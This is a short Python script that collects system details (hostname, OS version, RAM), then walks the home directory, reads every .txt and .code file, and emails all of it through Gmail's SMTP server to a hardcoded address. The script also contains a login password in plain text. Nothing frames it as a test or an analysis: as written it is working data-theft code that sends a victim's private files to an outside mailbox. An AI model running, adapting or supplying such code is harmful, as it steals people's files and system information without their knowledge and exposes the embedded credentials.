import os
import platform
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def get_system_info():
    uname = platform.uname()
    os_info = f"System: {uname.system}"
    os_info += f"\nNode Name: {uname.node}"
    os_info += f"\nRelease: {uname.release}"
    os_info += f"\nVersion: {uname.version}"
    os_info += f"\nMachine: {uname.machine}"
    os_info += f"\nProcessor: {platform.processor()}"
    
    os_info += "\n\nRAM Information:"
    with open('/proc/meminfo') as mem:
        for line in mem:
            if line.startswith('MemTotal:'):
                total_memory = line.split()[1]
                os_info += f"\nTotal RAM: {total_memory} kB"
                break
    
    return os_info

def scan_text_files(directory):
    text_extensions = [".txt", ".code"]
    text_files = []
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.lower().endswith(ext) for ext in text_extensions):
                text_files.append(os.path.join(root, file))
    
    return text_files

def read_text_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
    except UnicodeDecodeError:
        with open(file_path, 'r', encoding='latin-1') as file:
            content = file.read()
    return content


sender_email = "tirawatnantamas@gmail.com"
receiver_email = "tirawatnantamas@gmail.com"  
password = "deiz davp nmxd yibc"  


message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = "Text and Code File Contents"

os_info = get_system_info()

home_directory = os.path.expanduser("~")
text_files = scan_text_files(home_directory)

body = os_info + "\n\n"

if text_files:
    body += "Text and Code files found:\n"
    for txt_file in text_files:
        body += f"- {txt_file}\n"
        body += read_text_file(txt_file) + "\n\n"
else:
    body += "\nNo text or code files found in the directory.\n"

message.attach(MIMEText(body, "plain"))

try:
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, password)
        text = message.as_string()
        server.sendmail(sender_email, receiver_email, text)
    print("Email sent successfully!")
except Exception as e:
    print(f"Error sending email: {e}")
